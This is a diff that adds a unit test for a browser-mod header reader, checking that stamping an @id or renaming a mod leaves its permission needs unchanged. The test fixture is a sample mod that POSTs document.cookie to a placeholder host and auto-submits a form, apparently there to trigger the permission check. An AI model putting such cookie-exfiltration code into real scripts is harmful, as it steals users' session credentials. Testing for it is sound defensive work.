@@ -169,3 +169,27 @@ document.body.dataset.x = '1';
   assert.equal(id({ file: 'facebook-com-filter-ai.js', site: 'facebook.com' }), 'facebook.com/facebook-com-filter-ai', 'one imported before keeps its id');
   assert.equal(id({ file: 'facebook.com-x.js', site: 'facebook.com' }), 'facebook.com/facebook.com-x', 'a computer file named like that, by sync, stays');
 });
+
+// Stable ids (docs/PHONE-SYNC.md 2a, Tim 11-18): the reader keeps and reports the header's first valid @id; adding
+// one (TRIF stamps it) or renaming changes nothing a hold reads: the needs and their lines stay, so an allowed mod
+// stays allowed.
+test('@id: the reader reports it; stamping it or a new @name never makes a mod wait', () => {
+  const free = '// ==WebMod==\n// @name Sender\n// @match https://example.com/*\n// ==/WebMod==\nfetch("https://elsewhere.example/x", { method: "POST", body: document.cookie });\ndocument.querySelector("form").submit();\n';
+  const plain = R.readMod(free, { site: 'example.com' });
+  assert.equal(plain.uid, null, 'none: null');
+  const uid = '3f2b8c1e-6d4a-4b7e-9c1f-2a5d8e7b9c01';
+  const stamped = free.replace('// @name Sender\n', `// @name Sender\n// @id ${uid}\n`);
+  const s = R.readMod(stamped, { site: 'example.com' });
+  assert.equal(s.uid, uid);
+  assert.equal(s.id, plain.id, 'its file id stays');
+  assert.ok(plain.needs.length > 0, 'a free mod that sends asks');
+  assert.deepEqual(s.needs, plain.needs, 'the same needs and lines with the id');
+  const renamed = R.readMod(stamped.replace('@name Sender', '@name Quiet sender'), { site: 'example.com', file: 'sender.js' });
+  assert.deepEqual(renamed.needs, plain.needs, 'the same needs renamed');
+  const allowed = R.allow(plain.needs, {});
+  assert.equal(R.waiting(s.needs, allowed).length, 0, 'what was allowed covers the stamped version');
+  assert.equal(R.waiting(renamed.needs, allowed).length, 0, 'and the renamed one');
+  assert.equal(R.readMod(free.replace('// @name Sender\n', '// @name Sender\n// @id NOT_AN_ID\n'), { site: 'example.com' }).uid, null, 'not an id: null');
+  assert.equal(R.readMod(free.replace('// @name Sender\n', '// @name Sender\n// @id NOT_AN_ID\n// @id aaaaaaaa-2\n'), { site: 'example.com' }).uid, null, 'the first @id line counts');
+  assert.equal(R.readMod(free.replace('// @name Sender\n', '// @name Sender\n// @id aaaaaaaa-1\n// @id aaaaaaaa-2\n'), { site: 'example.com' }).uid, 'aaaaaaaa-1');
+});
